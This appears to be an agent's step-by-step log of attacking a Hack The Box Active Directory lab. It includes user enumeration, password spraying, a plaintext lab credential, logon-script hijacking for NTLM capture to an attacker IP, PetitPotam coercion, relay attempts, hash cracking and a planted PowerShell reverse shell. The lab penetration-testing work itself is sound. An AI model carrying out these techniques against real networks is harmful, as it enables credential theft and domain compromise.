hypothesis: Garfield reachable via machines_us-4 VPN
action: nmap full port scan TCP + targeted UDP
why: all 65535 TCP ports filtered, no UDP responses. Need release arena VPN.

hypothesis: Initial recon on Garfield
action: nmap -sC -sV on 10.129.16.228
evidence: DC01.garfield.htb — Windows Server 2019 AD DC. Ports: DNS(53), Kerberos(88), RPC(135), SMB(445), LDAP(389), RDP(3389), WinRM(5985). SMB signing required. Clock skew +8h. Domain: GARFIELD.

hypothesis: Anonymous/null access reveals domain users
action: Kerberos user enum with themed names
evidence: Valid users: administrator, j.arbuckle (both KDC_ERR_PREAUTH_FAILED). Disabled: guest, krbtgt. Invalid: admin, garfield, odie, nermal, arlene, jon, liz. j.arbuckle is a real domain user.

hypothesis: More themed Garfield usernames exist
action: Kerberos enum with 40+ names (naming patterns, service accounts, Garfield characters)
evidence: Found l.wilson (KDC_ERR_PREAUTH_FAILED = valid, preauth required). No AS-REP roastable accounts. Valid users: administrator, j.arbuckle, l.wilson.

hypothesis: j.arbuckle or l.wilson has a weak/themed password
action: Kerberos spray with 36 themed passwords (Garfield, Lasagna, IHateMondays, seasons, etc)
why: all KDC_ERR_PREAUTH_FAILED, no lockouts. Password is not a simple themed guess.

hypothesis: SMB null or LDAP anonymous reveals shares/users
action: SMB null (STATUS_ACCESS_DENIED on listShares), LDAP anonymous (operationsError 000004DC: requires authenticated bind for searches)
why: DC restricts both null SMB share listing and anonymous LDAP queries. Need authenticated access.

hypothesis: DNS zone transfer or RID cycling reveals additional info
action: dig axfr (denied), dig ANY (revealed 192.168.100.1 second IP), lookupsid (STATUS_ACCESS_DENIED on lsarpc)
evidence: Zone transfer denied. RID cycling blocked. BUT DNS ANY reveals DC has second IP 192.168.100.1 — internal network exists. Also found IPv6 dead:beef::605d:7d67:bb30:a026.

hypothesis: Additional DNS records reveal more hostnames/services
action: DNS subdomain brute (50 names) + SRV records
why: no subdomains found. SRV records only point to DC01. Single-DC environment.

hypothesis: j.arbuckle:Th1sD4mnC4t!@1978 are valid domain creds
action: SMB login with NTLM auth
evidence: SMB auth SUCCESS. Shares visible: ADMIN$, C$, IPC$, NETLOGON, SYSVOL. C$/ADMIN$ access suggests high privileges. WinRM returned 401 (not in Remote Management Users).

hypothesis: New IP 10.129.17.44 is reachable and is the same Garfield box
disproof: ping fails or nmap shows different services

hypothesis: j.arbuckle can get shell via alternative exec methods despite WMI denied
action: testing smbexec/atexec/psexec

hypothesis: j.arbuckle can execute commands via smbexec/psexec/atexec/wmiexec
action: tried all 4 impacket exec tools
why: All return rpc_s_access_denied or 'share not writable'. j.arbuckle has READ-ONLY access to ADMIN$/C$, not admin privileges. No write to any share. No RPC exec.

hypothesis: j.arbuckle still has read access to C$/ADMIN$ on new IP 10.129.17.44
action: crackmapexec --shares
why: No READ/WRITE on C$ or ADMIN$. Only IPC$, NETLOGON, SYSVOL readable. j.arbuckle is regular domain user, not privileged.

hypothesis: Bloodhound reveals ACL abuse path from j.arbuckle
action: bloodhound-python collection + ACE analysis
evidence: Attack chain: l.wilson->ForceChangePassword->l.wilson_adm->ForceChangePassword+WriteAccountRestrictions->RODC01$->ForceChangePassword->krbtgt_8245. RODC has Admin in RevealedUsers. BUT j.arbuckle/IT Support have NO outbound ACEs. Need l.wilson creds first.

hypothesis: LAPS/gMSA/ADCS/password-in-description available
action: LDAP queries for LAPS attrs, gMSA, ADCS enrollment, descriptions
why: No LAPS deployed, no gMSA accounts, no ADCS, descriptions are all stock.

hypothesis: RODC01 (192.168.100.2) is reachable from attacker
action: ping
why: 100% packet loss. Internal-only network, not routed to us.

hypothesis: j.arbuckle can write to SYSVOL scripts directory
action: smbclient put test file
evidence: Successfully wrote to garfield.htb\scripts\. printerDetect.bat is a logon script — can be replaced to coerce NTLM auth or execute commands as l.wilson.

hypothesis: Modified printerDetect.bat in SYSVOL to coerce NTLM auth to responder at 10.10.17.114
action: uploaded bat with net use + dir to \10.10.17.114\share
evidence: Script uploaded. Waiting for l.wilson logon to trigger. Responder running on tun0.

hypothesis: PetitPotam coercion captures useful NTLM hash
action: coercer with MS-EFSR against DC01
evidence: Captured DC01$ NTLMv2 hash via MS-EFSR EfsRpcAddUsersToFile. Machine hash not directly crackable but confirms coercion works. SMB signing blocks relay.

hypothesis: NTLM relay DC01$ to LDAP for RBCD delegation
action: ntlmrelayx with --delegate-access on SMB 445, coercing via PetitPotam

hypothesis: ntlmrelayx can bind port 445 and relay DC01$ to LDAP
action: testing without sudo since container allows unprivileged port 445

hypothesis: ntlmrelayx can relay DC01$ to LDAP for RBCD
action: tried ntlmrelayx with --delegate-access, both user and system impacket versions
why: ntlmrelayx exits silently after 'Servers started' — ports never actually bind. Impacket threading issue in Docker background mode. Relay approach blocked by tooling, not target.

hypothesis: DC01 cannot connect back to us on port 445 via raw socket
action: raw socket listener on 445 + cme petitpotam
evidence: No connection in 20s. Yet earlier Responder (as root) DID receive DC01$ hashes via coercer. Discrepancy may be due to Responder binding on all interfaces or coercer using different coercion UNC path format.

hypothesis: printerDetect.bat is a GPO logon script that triggers on user login
action: waited 60s for hash, checked GPO config
why: No hash received. Script is in SYSVOL scripts/ but may not be assigned as GPO logon script. Also: GPO reveals PasswordComplexity=0, LockoutBadCount=0 — unlimited spray possible.

hypothesis: l.wilson password follows j.arbuckle pattern with character/theme variations
action: 77 pattern-based passwords sprayed against l.wilson and l.wilson_adm
why: All STATUS_LOGON_FAILURE. Password doesn't follow the same leet-speak pattern.

hypothesis: Raw ACL audit reveals paths Bloodhound missed
action: LDAP query with SD_FLAGS_OID for nTSecurityDescriptor on key objects
evidence: IT Support has WP|RP on 'member' attr of Allowed RODC PRG. j.arbuckle can add ANY user to the RODC password replication allow list. New attack chain: add Administrator to Allowed RODC PRG → force RODC replication → extract Administrator hash. Completely bypasses need for l.wilson.

hypothesis: IT Support WriteProp on bf9679a8 controls group membership
action: schema lookup
why: bf9679a8 = scriptPath, NOT member. The ACE gives WP on scriptPath of user objects. Can set logon scripts for l.wilson → NTLM capture.

hypothesis: l.wilson NTLMv2 hash crackable with rockyou/rules/themed/darkc0de
action: john with rockyou, rockyou+best64 rules, 1944 themed passwords, darkc0de, keyboard walks
why: Hash not cracked with any wordlist. Password is custom/complex despite complexity=OFF. Need either bigger wordlist or different approach to get NT hash.

hypothesis: Reverse shell via scriptPath bat works
action: uploaded PS base64 revshell bat, waited 4 min
why: No callback. Likely AMSI/AV blocking PowerShell execution. NTLM capture bat DID work, proving scriptPath execution works.

hypothesis: Box IP changed from 10.129.16.228 to 10.129.17.44
action: ping + CME test
evidence: 10.129.17.44 responds, DC01.garfield.htb same domain. Old IP unreachable.

hypothesis: Bat redirect output to UNC SMB share works
action: printerDetect.bat with whoami > \attacker\share\info.txt
why: No connection to smbserver. UNC redirect in logon script context doesn't trigger SMB connection like net use/dir does. Need different exfil method.

hypothesis: l.wilson scriptPath logon script still fires after initial capture
action: restored NTLM capture bat, waited 90s with responder
why: No new hashes captured. HTB simulated logon may have stopped or has longer interval. We already have the NTLMv2 hash from earlier capture.

hypothesis: l.wilson logon simulation fires on fresh box instance within 10 min
action: set scriptPath + uploaded bat, polled 30x20s
why: No logon after 10 min on fresh instance. Either simulation interval is very long, or scriptPath logon scripts aren't processed in the simulation.

hypothesis: ntlmrelayx can relay DC01$ PetitPotam to LDAP for RBCD
action: tried ntlmrelayx multiple ways - ports never bind despite claiming started
evidence: Machine account FAKEPC$ created. ntlmrelayx SMB server has threading bug - port 445 never actually opens despite 'Servers started' message. Raw socket/smbserver.py/responder all bind 445 fine. HTTP coercion (WebDAV) not viable - WebClient not running on DC01. Need to either patch ntlmrelayx or write custom relay.

hypothesis: Logon script simulation fires on fresh box
action: polled 30x20s (10 min) on fresh instance 10.129.17.46
why: No logon detected. scriptPath set on both l.wilson and l.wilson_adm. Bat uploaded. Either simulation doesn't process scriptPath, or interval is very long (>10min).

hypothesis: Relay DC01$ SMB auth to LDAP for RBCD
action: ntlmrelayx (fixed with sleep infinity pipe) + PetitPotam coercion
why: SMB client requested signing - LDAP relay fails. Error: 'The client requested signing. Relaying to LDAP will not work!' Must try LDAPS instead.

hypothesis: Relay DC01$ to LDAPS bypasses signing issue
action: ntlmrelayx -t ldaps:// + PetitPotam coercion
why: LDAPS channel binding enforced: 'socket ssl wrapping error: Connection reset by peer'. Both LDAP (signing) and LDAPS (channel binding) relay paths are dead.

hypothesis: VBS ADSI SetPassword is the correct mechanism for ForceChangePassword via scriptPath
action: uploaded reset.vbs + printerDetect.bat calling it, polling for result
